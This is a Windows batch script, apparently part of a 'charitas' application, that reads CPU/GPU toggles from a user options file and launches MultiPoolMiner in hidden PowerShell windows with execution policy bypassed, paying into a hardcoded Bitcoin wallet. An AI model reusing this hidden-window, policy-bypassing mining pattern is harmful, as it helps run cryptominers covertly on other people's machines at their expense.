@echo off
cd /d %~dp0

:: FOR /F "tokens=1,2 delims==" %%A IN (charitas.properties) DO (
::    IF "%%A"=="cputoggle" SET cputog=%%B 
::)
::FOR /F "tokens=1,2 delims==" %%A IN (charitas.properties) DO (
::    IF "%%A"=="gputoggle" SET gputog=%%B
::)

set OnAC=false
wmic path win32_battery get BatteryStatus || goto fuckCMD
set cmd=WMIC /NameSpace:\\root\WMI Path BatteryStatus Get PowerOnline
%cmd% | find /i "true" > nul && set OnAC=true
if %OnAC% == true (goto eof)

:fuckCMD
setlocal enabledelayedexpansion
set json=
for /f "delims=" %%x in (%appdata%\charitas\options.json) do set "json=!json!%%x"

rem Remove quotes
set json=%json:"=%

rem Remove braces
set "json=%json:~1,-1%"

rem Separate parts at comma into individual assignments 

FOR /F "tokens=1,2 delims=," %%J in ("%json%") do (
FOR /F "tokens=2 delims=:" %%T in ("%%J") do (set cpu=%%T)
FOR /F "tokens=2 delims=:" %%T in ("%%K") do (set gpu=%%T)
)

rem trim leading spaces
FOR /F "tokens=1*" %%S in ("%cpu%") do (set cpu=%%S)
FOR /F "tokens=1*" %%S in ("%gpu%") do (set gpu=%%S)

IF %cpu%==true (
    IF %gpu%==true (
        set "toggler=cpu,nvidia,amd"
    ) ELSE (
        set "toggler=cpu"
    )
) ELSE (
    IF %gpu%==true (
        set "toggler=nvidia,amd"
    ) ELSE (
        set "toggler=cpu,nvidia,amd"
    )
)

rem ON MINING RIGS SET MININGRIG=TRUE
SET MININGRIG=FALSE

if not "%GPU_FORCE_64BIT_PTR%"=="1" (setx GPU_FORCE_64BIT_PTR 1) > nul
if not "%GPU_MAX_HEAP_SIZE%"=="100" (setx GPU_MAX_HEAP_SIZE 100) > nul
if not "%GPU_USE_SYNC_OBJECTS%"=="1" (setx GPU_USE_SYNC_OBJECTS 1) > nul
if not "%GPU_MAX_ALLOC_PERCENT%"=="100" (setx GPU_MAX_ALLOC_PERCENT 100) > nul
if not "%GPU_SINGLE_ALLOC_PERCENT%"=="100" (setx GPU_SINGLE_ALLOC_PERCENT 100) > nul
if not "%CUDA_DEVICE_ORDER%"=="PCI_BUS_ID" (setx CUDA_DEVICE_ORDER PCI_BUS_ID) > nul

set "command=& .\multipoolminer.ps1 -DisableDevFeeMining -WarmupTime 30 -Wallet 14P7kJecY48Cd2jVmKNTwu7Sv3CkcQfESH -WorkerName v1.0 -Region us -Currency btc -DeviceName %toggler% -PoolName blockmasters,nlpool,zpool -Donate 10 -Watchdog -MinerStatusURL https://multipoolminer.io/monitor/miner.php -SwitchingPrevention 1 --charitas-role=charitas-miner"

if exist "~*.dll" del "~*.dll" > nul 2>&1

if /I "%MININGRIG%" EQU "TRUE" goto MINING

if exist ".\SnakeTail.exe" goto SNAKETAIL

start /min /belownormal pwsh -noexit -windowstyle hidden -executionpolicy bypass -command "& .\reader.ps1 -log 'MultiPoolMiner_\d\d\d\d-\d\d-\d\d\.txt' -sort '^[^_]*_' -quickstart --charitas-role=charitas-log"
goto MINING

:SNAKETAIL
tasklist /fi "WINDOWTITLE eq SnakeTail - MPM_SnakeTail_LogReader*" /fo TABLE 2>nul | find /I /N "SnakeTail.exe" > nul 2>&1
if "%ERRORLEVEL%"=="1" start /min .\SnakeTail.exe .\MPM_SnakeTail_LogReader.xml

:MINING
start /min /belownormal pwsh -noexit -executionpolicy bypass -windowstyle hidden -command "%command%"
echo "yea they opened"
exit /b